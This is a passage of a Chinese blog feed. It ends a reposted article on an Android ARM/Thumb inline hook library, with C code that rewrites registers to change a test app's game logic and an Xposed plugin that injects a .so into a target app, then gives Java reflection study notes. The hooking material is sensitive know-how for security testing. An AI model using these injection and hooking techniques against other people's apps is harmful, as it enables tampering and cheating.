&lt;li&gt;图中X的值如何确定？我们是从上到下一条条修复备份指令然后拼接的，也就是说这条BLS指令下方的指令在修复它的时候还没被修复。这样这个X的值就无法确定？&lt;/li&gt;
&lt;li&gt;Thumb-2模式在备份时，12 Bytes最大是可能备份6条Thumb16指令的。也就是说，可能在备份指令中出现多条条件跳转指令，这时候会出现跳转嵌套，如下图：&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144256.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;为了解决第一个问题，本人先在Hook一开始的init函数中建立一个记录所有备份指令修复后长度的数组&lt;code&gt;pstInlineHook-&amp;gt;backUpFixLengthList&lt;/code&gt;，然后当修复条件跳转指令时，通过计算其后面修复指令的长度来得到X的值。这个方法一开始只是用来解决问题1的，当时还没想到问题2的情况。因为这个数组中看不出后面的指令是否存在其它条件跳转指令，所以最后的跳转嵌套时会出错。那第二个问题如何解决呢？本人开始意识到如果条件跳转指令要用这种”两段“式的修复方式的话，会使得之后的修复逻辑变得很复杂。但是按照原程序的执行逻辑顺序似乎又只能这么做…吗？不，第一次优化方案如下所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144338.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这个方案通过连续的三个跳转命令来缩小这个BXX结构，使其按照原来的逻辑跳转到符合条件的跳转指令去，然后再跳转一次。至此其实已经解决了当前遇到的“两段”式麻烦。但是最后本人又想到了一个新的优化方案：&lt;code&gt;逆向思维方案&lt;/code&gt;，可以简化跳转逻辑并在Arm32和Thumb32下减少一条跳转指令的空间（Thumb16下由于需要补NOP所以没有减小空间占用），如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144409.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;图中可以看到，原来的BLS指令被转化为了BHI指令，也就是&lt;code&gt;小于等于&lt;/code&gt;的跳转逻辑变成了&lt;code&gt;大于&lt;/code&gt;。这样一来，原本跳转的目标逻辑现在就可以紧贴到BHI指令下面。从而使得条件跳转指令的修复代码也和其它指令一样，成为一个连续的代码段。并且BHI后面的参数在Thumb16中将固定为12。那么对于多条条件跳转指令来说呢？如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144514.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从图中可以看出来，又回到了最初从上到下一一对应，末尾跳转的形式。而之前新增的&lt;code&gt;pstInlineHook-&amp;gt;backUpFixLengthList&lt;/code&gt;数组依然保留了，因为当跳转的目标地址依然在备份代码范围内时需要用到它，&lt;a href=&#34;https://gtoad.github.io/2018/07/13/Android-Inline-Hook-Fix/&#34;&gt;《Android Inline Hook中的指令修复》&lt;/a&gt;中会讲解，此处不再赘述。&lt;/p&gt;

&lt;h2 id=&#34;使用说明-以xposed为例&#34;&gt;使用说明（以Xposed为例）&lt;/h2&gt;

&lt;p&gt;使用者先找到想要Hook的目标，然后在本项目中写自己需要的Hook功能，然后在项目根目录使用&lt;code&gt;ndk-build&lt;/code&gt;进行编译，需要注意的是本项目中需要严格控制arm和thumb模式，所以&lt;code&gt;/jni/InlineHook/&lt;/code&gt;和&lt;code&gt;/jni/Interface/&lt;/code&gt;目录下的Android.mk中&lt;code&gt;LOCAL_ARM_MODE := arm&lt;/code&gt;不要修改，因为现在默认是编译成thumb模式，这样一来第二步和自定义的Hook函数就不再是设计图中的ARM模式了。自己写的Hook功能写在InlineHook.cpp下，注意&lt;code&gt;constructor&lt;/code&gt;属性，示例代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;//用户自定义的stub函数，嵌入在hook点中，可直接操作寄存器等改变游戏逻辑操作 
//这里将R0寄存器锁定为0x333，一个远大于30的值 
//@param regs 寄存器结构，保存寄存器当前hook点的寄存器信息 

//Hook功能函数一定要有这个pt_regs *regs输入参数才能获取stub中r0指向的栈上保存的全部寄存器的值。 
void EvilHookStubFunctionForIBored(pt_regs *regs)
{
    LOGI(&amp;quot;In Evil Hook Stub.&amp;quot;);
    //将r0修改为0x333 
    regs-&amp;gt;uregs[0]=0x333;
}

void ModifyIBored() __attribute__((constructor));

/** * 针对IBored应用，通过inline hook改变游戏逻辑的测试函数 */
void ModifyIBored()
{
    LOGI(&amp;quot;In IHook&#39;s ModifyIBored.&amp;quot;);
    int target_offset = 0x43b8; //想Hook的目标在目标so中的偏移 
    bool is_target_thumb = true; //目标是否是thumb模式？ 
    void* pModuleBaseAddr = GetModuleBaseAddr(-1, &amp;quot;libnative-lib.so&amp;quot;); //目标so的名称 
    if(pModuleBaseAddr == 0)
    {
        LOGI(&amp;quot;get module base error.&amp;quot;);
        return;
    }
    
    uint32_t uiHookAddr = (uint32_t)pModuleBaseAddr + target_offset; //真实Hook的内存地址 
    //之所以人来判断那是因为Native Hook之前肯定是要逆向分析一下的，那时候就能知道是哪种模式。而且自动识别arm和thumb比较麻烦。 
    if(is_target_thumb){ 
        uiHookAddr++;
        LOGI(&amp;quot;uiHookAddr is %X in thumb mode&amp;quot;, uiHookAddr);
    }
    else{
        LOGI(&amp;quot;uiHookAddr is %X in arm mode&amp;quot;, uiHookAddr);
    }
    
    InlineHook((void*)(uiHookAddr), EvilHookStubFunctionForIBored);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;本项目在有Xposed框架的测试机上运行时，可以使用一个插件在APP的起始环节就加载本项目的so。本人使用这个插件加载so就很方便啦，不用重启手机，它会自动去系统路径下寻找文件名符合的so然后加载到目标APP中。这个插件的关键代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class HookToast implements IXposedHookLoadPackage{
    @Override
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpp) throws Throwable {
        String packageName=&amp;quot;&amp;quot;;
        String activityName=&amp;quot;&amp;quot;;
        String soName=&amp;quot;&amp;quot;;
        try{
            packageName = &amp;quot;com.sec.gtoad.inline_hook_test3&amp;quot;; //目标app
            activityName = &amp;quot;com.sec.gtoad.inline_hook_test3.MainActivity&amp;quot;; //目标app的启动activity
            soName = &amp;quot;InlineHook&amp;quot;;                          //我们so的名称（libInlineHook.so）
        } catch (Exception e){
            XposedBridge.log(&amp;quot;parse result &amp;quot; + e.getMessage());
            Log.w(&amp;quot;GToad&amp;quot;, &amp;quot;parse result &amp;quot; + e.getMessage());
        }

        if(!lpp.packageName.equals(packageName)) return;
        XposedBridge.log(&amp;quot;load package: &amp;quot; + lpp.packageName);
        Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;load package: &amp;quot; + lpp.packageName);

        hookActivityOnCreate(lpp,activityName,soName,packageName); //当启动Activity开始创建时，就加载我们的so库

    }

    public static boolean loadArbitrarySo(XC_LoadPackage.LoadPackageParam lpp, String soname, String pkg) {
        if (lpp.packageName.equals(pkg)) {
            XposedBridge.log(&amp;quot;trying to load so file: &amp;quot; + soname + &amp;quot; for &amp;quot; + pkg);
            Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;trying to load so file: &amp;quot; + soname + &amp;quot; for &amp;quot; + pkg);
            try {
                Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;loading1&amp;quot;);

                // /vendor/lib:/system/lib 只要把我们的so放到这些目录之一插件就能找到
                Log.w(&amp;quot;GToad&amp;quot;,System.getProperty(&amp;quot;java.library.path&amp;quot;)); 
                System.loadLibrary(soname);
                Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;loading2&amp;quot;);
            } catch (Exception e) {
                XposedBridge.log(&amp;quot;failed to load so&amp;quot;);
                Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;failed to load so&amp;quot;);
                return false;
            }
            XposedBridge.log(&amp;quot;&amp;quot; + soname + &amp;quot; loaded&amp;quot;);
            Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;&amp;quot; + soname + &amp;quot; loaded&amp;quot;);
            return true;
        }
        XposedBridge.log(&amp;quot;&amp;quot; + pkg + &amp;quot; not found&amp;quot;);
        Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;&amp;quot; + pkg + &amp;quot; not found&amp;quot;);
        return false;
    }

        private void hookActivityOnCreate(final XC_LoadPackage.LoadPackageParam lpp, final String activityName, final String soName, final String packageName){
        try {
            XposedHelpers.findAndHookMethod(activityName, lpp.classLoader, &amp;quot;onCreate&amp;quot;, Bundle.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam mhp) throws Throwable {
                    XposedBridge.log(&amp;quot;before &amp;quot; + activityName + &amp;quot;.onCreate&amp;quot;);
                    Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;before &amp;quot; + activityName + &amp;quot;.onCreate&amp;quot;);
                    super.beforeHookedMethod(mhp);
                }

                @Override
                protected void afterHookedMethod(MethodHookParam mhp) throws Throwable {
                    XposedBridge.log(&amp;quot;after &amp;quot; + activityName + &amp;quot;.onCreate&amp;quot;);
                    Log.w(&amp;quot;GToad&amp;quot;,&amp;quot;after &amp;quot; + activityName + &amp;quot;.onCreate&amp;quot;);
                    loadArbitrarySo(lpp,soName,packageName);
                    super.afterHookedMethod(mhp);
                }
            });
        }  catch (Throwable e) {
            XposedBridge.log(&amp;quot;&amp;quot; + activityName + &amp;quot;.onCreate &amp;quot; + e.getMessage());
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;

&lt;p&gt;本项目最终形式为一个so库，它可以与任何一个能加载它的工具进行配合，达到Native Hook的效果。并且Hook的最小粒度单位是任意一条汇编指令，这在日常测试中作用很大。&lt;/p&gt;

&lt;p&gt;真的非常感谢腾讯游戏安全实验室和ele7enxxh大牛的开源项目为本项目提供的参考。&lt;/p&gt;

&lt;h2 id=&#34;文末说明&#34;&gt;文末说明&lt;/h2&gt;

&lt;p&gt;由于本项目的初衷是为了满足作者自身测试需求才做的，所以关于文中的一些解释与需求可能与别的同学的理解有偏差，这很正常。此处补充解释一下：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;关于目前公开的Android Native Hook工具寥寥无几这一点我补充解释一下：唯一一个公开且接近于Java Hook的Xposed那样好用的工具可能就只是Cydia Substrate了。但是该项目已经好几年没更新，并且只支持到安卓5.0以前。还有一个不错的Native Hook工具是Frida，但是它的运行原理涉及调试，因此遇到反调试会相当棘手。由于本人反调试遇到的情况较多，所以Frida不怎么用。&lt;/li&gt;
&lt;li&gt;为什么不在thumb-2模式设计时都使用thumb？因为第二部分写汇编的时候用arm写起来容易，而且文中解释过无论跳转前是arm还是thumb模式，跳转后想要用thumb模式都需要给地址+1，所以当然能用arm的地方就用arm，这样方便。并且如果有多个不同模式的Hook目标，这时用户自定义的Hook函数只能统一编译成同一个模式，所以选择ARM模式。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://gslab.qq.com/portal.php?mod=view&amp;amp;aid=168&#34;&gt;腾讯游戏安全实验室&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://ele7enxxh.com/Android-Arm-Inline-Hook.html&#34;&gt;ele7enxxh的博客&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;本文转载自：&lt;a href=&#34;https://gtoad.github.io/2018/07/06/Android-Native-Hook-Practice/&#34;&gt;GToad Blog&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Java反射机制学习笔记</title>
      <link>https://naivete.cc/post/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Wed, 25 Jul 2018 16:40:20 +0800</pubDate>
      
      <guid>https://naivete.cc/post/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      
        <description>

&lt;h2 id=&#34;java-反射机制学习记录&#34;&gt;Java 反射机制学习记录&lt;/h2&gt;

&lt;p&gt;在逆向中反射也是能经常看见，之前理解不是很深透，现在来重点学习一下，做个笔记。&lt;/p&gt;

&lt;h3 id=&#34;什么是反射机制&#34;&gt;什么是反射机制？&lt;/h3&gt;

&lt;p&gt;反射(Reflection)是Java 程序开发语言的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。 通俗一点：在动态运行时，获取到一个类的所有方法以及成员。简而言之，通过反射，我们可以在&lt;strong&gt;运行时&lt;/strong&gt;获得程序或程序集中每一个类型的成员和成员的信息。&lt;/p&gt;

&lt;h3 id=&#34;作用&#34;&gt;作用？&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;1.在运行时判断任意一个对象所属的类；&lt;/li&gt;
&lt;li&gt;2.在运行时构造任意一个类的对象；&lt;/li&gt;
&lt;li&gt;3.在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；&lt;/li&gt;
&lt;li&gt;4.在运行时调用任意一个对象的方法&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;是运行时而不是编译时&#34;&gt;&lt;strong&gt;是运行时而不是编译时&lt;/strong&gt;&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;获取某些类的一些变量，调用某些类的私有方法。&lt;/li&gt;
&lt;li&gt;增加代码的灵活性。很多主流框架都使用了反射技术.像ssh框架都采用两种技术 xml做配置文件+反射技术.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;基本使用&#34;&gt;基本使用&lt;/h3&gt;

&lt;p&gt;反射相关的类一般都在java.lang.relfect 包里。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;获取Class对象 3种方法&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;(1)使用Class类的forName静态方法:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static Class&amp;lt;?&amp;gt; forName(String className)
   //在JDBC开发中常用此方法加载数据库驱动:
   Class.forName(driver);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(2)直接获取某一个对象的class，比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   Class&amp;lt;?&amp;gt; klass = int.class;
   Class&amp;lt;?&amp;gt; classInt = Integer.TYPE;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;(3)调用某个对象的getClass()方法,比如:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   StringBuilder str = new StringBuilder(&amp;quot;123&amp;quot;);
   Class&amp;lt;?&amp;gt; klass = str.getClass();
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;判断是否为某一个类的实例&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;一般使用instanceof来判断，也可以借助反射中的Class对象的isInstance()方法来判断  是一个Native方法：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public native boolean isInstance(Object obj);
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;创建实例&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;通过放射来生成对象两种方式：&lt;/p&gt;

&lt;p&gt;（1）使用Class对象的newInstance()方法来创建Class对象对应类的实例。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   Class&amp;lt;?&amp;gt; c = String.class;
   Object str = c.newInstance();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;（2）先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   //获取String所对应的Class对象
   Class&amp;lt;?&amp;gt; c = String.class;
   //获取String类带一个String参数的构造器
   Constructor constructor = c.getConstructor(String.class);
   //根据构造器创建实例
   Object obj = constructor.newInstance(&amp;quot;23333&amp;quot;);
   System.out.println(obj);
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;获取方法&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;getDeclaredMethods()方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   public Method[] getDeclaredMethods() throws SecurityException
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;getMethods()方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   public Method[] getMethods() throws SecurityException
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   public Method getMethod(String name, Class&amp;lt;?&amp;gt;... parameterTypes)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eg:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public class test {
    public static void test1() throws IllegalAccessException, InstantiationException,
            NoSuchMethodException, InvocationTargetException {
        Class&amp;lt;?&amp;gt; c = methodClass.class;
        Object object = c.newInstance();
        Method[] methods = c.getMethods();
        Method[] declaredMethods = c.getDeclaredMethods();
        Method method = c.getMethod(&amp;quot;add&amp;quot;, int.class, int.class); //获取add方法
        System.out.println(&amp;quot;getMethods获取的方法：&amp;quot;);
        for (Method m : methods)
            System.out.println(m);
        System.out.println(&amp;quot;getDeclaredMethods获取的方法：&amp;quot;);
        for (Method m : declaredMethods)
            System.out.println(m);
    }

    public static void main(String[] args) {
        try{
            test1();

        }catch (Exception e){
            e.printStackTrace();
        }

    }
}

class methodClass {
    public final int fuck = 3;
    public int add(int a,int b) {
        return a+b;
    }
    public int sub(int a,int b) {
        return a+b;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180725151348.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;获取构造器信息&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;通过Class类的getConstructor方法得到Constructor类的一个实例，而Constructor类有一个newInstance方法可以创建一个对象实例:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public T newInstance(Object ... initargs)
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;获取类的成员字段信息&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;getFiled&lt;/code&gt;: 访问公有的成员变量&lt;/p&gt;

&lt;p&gt;&lt;code&gt;getDeclaredField&lt;/code&gt;：所有已声明的成员变量。但不能得到其父类的成员变量&lt;/p&gt;

&lt;p&gt;&lt;code&gt;getFileds&lt;/code&gt;和&lt;code&gt;getDeclaredFields&lt;/code&gt;用法同上（参照Method）&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;调用方法&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;获取到方法后使用invoke()方法来调用这个方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public Object invoke(Object obj, Object... args)
           throws IllegalAccessException, IllegalArgumentException,
              InvocationTargetException
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eg：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public class test1 {
   
       public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
           Class&amp;lt;?&amp;gt; klass = methodClass.class;
           //创建methodClass的实例
           Object obj = klass.newInstance();
           //获取methodClass类的add方法
           Method method = klass.getMethod(&amp;quot;add&amp;quot;,int.class,int.class);
           //调用method对应的方法 =&amp;gt; add(1,4)
           Object result = method.invoke(obj,1,4);
           System.out.println(result);
       }
   
   }
   
   class methodClass {
   
       public final int fuck = 3;
       public int add(int a,int b) {
           return a+b;
       }
       public int sub(int a,int b) {
           return a+b;
       }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;创建数组&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static void testArray() throws ClassNotFoundException {
           Class&amp;lt;?&amp;gt; cls = Class.forName(&amp;quot;java.lang.String&amp;quot;);
           Object array = Array.newInstance(cls,25); //通过Array.newInstance()
           //往数组里添加内容
           Array.set(array,0,&amp;quot;hello&amp;quot;);  //Array类为java.lang.reflect.Array
           Array.set(array,1,&amp;quot;Java&amp;quot;);
           Array.set(array,2,&amp;quot;fuck&amp;quot;);
           Array.set(array,3,&amp;quot;Scala&amp;quot;);
           Array.set(array,4,&amp;quot;Clojure&amp;quot;);
           //获取某一项的内容
           System.out.println(Array.get(array,3));
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static Object newInstance(Class&amp;lt;?&amp;gt; componentType, int length)
           throws NegativeArraySizeException {
           return newArray(componentType, length);
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   private static native Object newArray(Class&amp;lt;?&amp;gt; componentType, int length)
           throws NegativeArraySizeException;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;   arrayOop Reflection::reflect_new_array(oop element_mirror, jint length, TRAPS) {
     if (element_mirror == NULL) {
       THROW_0(vmSymbols::java_lang_NullPointerException());
     }
     if (length &amp;lt; 0) {
       THROW_0(vmSymbols::java_lang_NegativeArraySizeException());
     }
     if (java_lang_Class::is_primitive(element_mirror)) {
       Klass* tak = basic_type_mirror_to_arrayklass(element_mirror, CHECK_NULL);
       return TypeArrayKlass::cast(tak)-&amp;gt;allocate(length, THREAD);
     } else {
       Klass* k = java_lang_Class::as_Klass(element_mirror);
       if (k-&amp;gt;oop_is_array() &amp;amp;&amp;amp; ArrayKlass::cast(k)-&amp;gt;dimension() &amp;gt;= MAX_DIM) {
         THROW_0(vmSymbols::java_lang_IllegalArgumentException());
       }
       return oopFactory::new_objArray(k, length, THREAD);
     }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Array类的set()和get()方法都为Native方法，在HotSpot JVM里分别对应Reflection::array_set和Reflection::array_get方法&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;获取泛型&lt;/p&gt;

&lt;p&gt;getGenericHelper(HashMap&lt;String, Person&gt; map)&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static  void getGenericType() {
           try {
               Method method =TestHelper.class.getDeclaredMethod(&amp;quot;getGenericHelper&amp;quot;,HashMap.class);
               Type[] genericParameterTypes = method.getGenericParameterTypes();
               // 检验是否为空
               if (null == genericParameterTypes || genericParameterTypes.length &amp;lt; 1) {
                   return ;
               }
               // 取 getGenericHelper 方法的第一个参数
   
               ParameterizedType parameterizedType=(ParameterizedType)genericParameterTypes[0];
               Type rawType = parameterizedType.getRawType();
               System.out.println(&amp;quot;----&amp;gt; rawType=&amp;quot; + rawType);
               Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();
               if (actualTypeArguments==genericParameterTypes || actualTypeArguments.length&amp;lt;1) {
                   return ;
               }
               //  打印出每一个类型          
               for (int i = 0; i &amp;lt; actualTypeArguments.length; i++) {
                   Type type = actualTypeArguments[i];
                   System.out.println(&amp;quot;----&amp;gt; type=&amp;quot; + type);
               }
           } catch (Exception e) {
   
           }
   
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;获得 Metho,Field,Constructor 的访问权限&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   int modifiers = method.getModifiers(); 
   Modifier.toString(modifiers); 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;invoke方法&#34;&gt;Invoke方法&lt;/h3&gt;

&lt;p&gt;比较重点&lt;/p&gt;

&lt;p&gt;invoke方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@CallerSensitive
public Object invoke(Object obj, Object... args)
    throws IllegalAccessException, IllegalArgumentException,
       InvocationTargetException
{
    if (!override) {
        if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {
            Class&amp;lt;?&amp;gt; caller = Reflection.getCallerClass();
            checkAccess(caller, clazz, obj, modifiers);
        }
    }
    MethodAccessor ma = methodAccessor;             // read volatile
    if (ma == null) {
        ma = acquireMethodAccessor();
    }
    return ma.invoke(obj, args);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;权限检查&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;首先检查AccessibleObject的override属性的值 。AccessibleObject 类是 Field、Method 和 Constructor 对象的基类 。override 默认为false,调试需要权限调用规则，反正不需要。&lt;/p&gt;

&lt;p&gt;默认情况下首先用Reflection.quickCheckMemberAccess(clazz, modifiers)方法检查方法是否为public，如果是的话跳出本步；如果不是public方法，那么用Reflection.getCallerClass()方法获取调用这个方法的Class对象，这是一个native方法:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   @CallerSensitive
       public static native Class&amp;lt;?&amp;gt; getCallerClass();
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   JNIEXPORT jclass JNICALL Java_sun_reflect_Reflection_getCallerClass__
   (JNIEnv *env, jclass unused)
   {
       return JVM_GetCallerClass(env, JVM_CALLER_DEPTH);
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;   JVM_ENTRY(jclass, JVM_GetCallerClass(JNIEnv* env, int depth))
     JVMWrapper(&amp;quot;JVM_GetCallerClass&amp;quot;);
   
     // Pre-JDK 8 and early builds of JDK 8 don&#39;t have a CallerSensitive annotation; or
     // sun.reflect.Reflection.getCallerClass with a depth parameter is provided
     // temporarily for existing code to use until a replacement API is defined.
     if (SystemDictionary::reflect_CallerSensitive_klass() == NULL || depth != JVM_CALLER_DEPTH) {
       Klass* k = thread-&amp;gt;security_get_caller_class(depth);
       return (k == NULL) ? NULL : (jclass) JNIHandles::make_local(env, k-&amp;gt;java_mirror());
     }
   
     // Getting the class of the caller frame.
     //
     // The call stack at this point looks something like this:
     //
     // [0] [ @CallerSensitive public sun.reflect.Reflection.getCallerClass ]
     // [1] [ @CallerSensitive API.method                                   ]
     // [.] [ (skipped intermediate frames)                                 ]
     // [n] [ caller                                                        ]
     vframeStream vfst(thread);
     // Cf. LibraryCallKit::inline_native_Reflection_getCallerClass
     for (int n = 0; !vfst.at_end(); vfst.security_next(), n++) {
       Method* m = vfst.method();
       assert(m != NULL, &amp;quot;sanity&amp;quot;);
       switch (n) {
       case 0:
         // This must only be called from Reflection.getCallerClass
         if (m-&amp;gt;intrinsic_id() != vmIntrinsics::_getCallerClass) {
           THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), &amp;quot;JVM_GetCallerClass must only be called from Reflection.getCallerClass&amp;quot;);
         }
         // fall-through
       case 1:
         // Frame 0 and 1 must be caller sensitive.
         if (!m-&amp;gt;caller_sensitive()) {
           THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), err_msg(&amp;quot;CallerSensitive annotation expected at frame %d&amp;quot;, n));
         }
         break;
       default:
         if (!m-&amp;gt;is_ignored_by_security_stack_walk()) {
           // We have reached the desired frame; return the holder class.
           return (jclass) JNIHandles::make_local(env, m-&amp;gt;method_holder()-&amp;gt;java_mirror());
         }
         break;
       }
     }
     return NULL;
   JVM_END
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;获取了这个Class对象caller后用checkAccess方法做一次快速的权限校验 :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   volatile Object securityCheckCache;
   
       void checkAccess(Class&amp;amp;lt;?&amp;amp;gt; caller, Class&amp;amp;lt;?&amp;amp;gt; clazz, Object obj, int modifiers)
           throws IllegalAccessException
       {
           if (caller == clazz) {  // 快速校验
               return;             // 权限通过校验
           }
           Object cache = securityCheckCache;  // read volatile
           Class&amp;amp;lt;?&amp;amp;gt; targetClass = clazz;
           if (obj != null
               &amp;amp;amp;&amp;amp;amp; Modifier.isProtected(modifiers)
               &amp;amp;amp;&amp;amp;amp; ((targetClass = obj.getClass()) != clazz)) {
               // Must match a 2-list of { caller, targetClass }.
               if (cache instanceof Class[]) {
                   Class&amp;amp;lt;?&amp;amp;gt;[] cache2 = (Class&amp;amp;lt;?&amp;amp;gt;[]) cache;
                   if (cache2[1] == targetClass &amp;amp;amp;&amp;amp;amp;
                       cache2[0] == caller) {
                       return;     // ACCESS IS OK
                   }
                   // (Test cache[1] first since range check for [1]
                   // subsumes range check for [0].)
               }
           } else if (cache == caller) {
               // Non-protected case (or obj.class == this.clazz).
               return;             // ACCESS IS OK
           }
   
           // If no return, fall through to the slow path.
           slowCheckMemberAccess(caller, clazz, obj, modifiers, targetClass);
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;先快速检查，未通过的话建立缓存，中间再检查；&lt;/p&gt;

&lt;p&gt;如果都没有通过：进行更详细的检查;&lt;/p&gt;

